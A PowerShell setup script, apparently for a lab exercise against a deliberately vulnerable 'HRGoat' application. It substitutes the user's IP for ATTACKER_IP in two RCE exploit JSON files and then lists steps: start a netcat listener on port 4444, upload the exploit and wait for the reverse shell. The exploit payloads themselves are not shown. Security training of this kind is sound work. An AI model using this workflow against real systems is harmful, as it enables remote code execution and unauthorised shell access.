# PowerShell script to prepare RCE exploit files by replacing ATTACKER_IP with the user's IP

# Function to get IP address
function Get-IPAddress {
    try {
        # Get IP address that can communicate with the internet
        $ip = (Get-NetIPAddress | Where-Object {
            $_.AddressFamily -eq 'IPv4' -and 
            $_.PrefixOrigin -ne 'WellKnown' -and 
            $_.IPAddress -ne '127.0.0.1'
        } | Select-Object -First 1).IPAddress
        
        return $ip
    } catch {
        return $null
    }
}

# Get the user's IP address
Write-Host "Detecting your IP address..."
$IP = Get-IPAddress

if (-not $IP) {
    Write-Host "Could not automatically detect your IP address."
    $IP = Read-Host "Please enter your IP address (the one the target server can reach)"
}

Write-Host "Using IP address: $IP"
Write-Host "This IP will be used in the exploit files."
Write-Host "Make sure this IP is reachable from the target server."
Write-Host ""

# Replace ATTACKER_IP in the Linux/macOS exploit file
if (Test-Path "rce_exploit.json") {
    Write-Host "Updating rce_exploit.json..."
    $content = Get-Content "rce_exploit.json"
    $content = $content -replace "ATTACKER_IP", $IP
    $content | Set-Content "rce_exploit.json"
    Copy-Item "rce_exploit.json" "rce_exploit.json.bak" -Force
    Write-Host "✓ Updated rce_exploit.json"
} else {
    Write-Host "× rce_exploit.json not found"
}

# Replace ATTACKER_IP in the Windows exploit file
if (Test-Path "rce_exploit_windows.json") {
    Write-Host "Updating rce_exploit_windows.json..."
    $content = Get-Content "rce_exploit_windows.json"
    $content = $content -replace "ATTACKER_IP", $IP
    $content | Set-Content "rce_exploit_windows.json"
    Copy-Item "rce_exploit_windows.json" "rce_exploit_windows.json.bak" -Force
    Write-Host "✓ Updated rce_exploit_windows.json"
} else {
    Write-Host "× rce_exploit_windows.json not found"
}

Write-Host ""
Write-Host "Setup complete! Your exploit files have been updated with your IP: $IP"
Write-Host ""
Write-Host "Next steps:"
Write-Host "1. Start a listener: nc -lvnp 4444 (you may need to install ncat from the Nmap package)"
Write-Host "2. Upload one of the exploit files to the HRGoat application"
Write-Host "3. Wait for the connection on your listener"
Write-Host ""
Write-Host "Note: Backup files with .bak extension have been created." 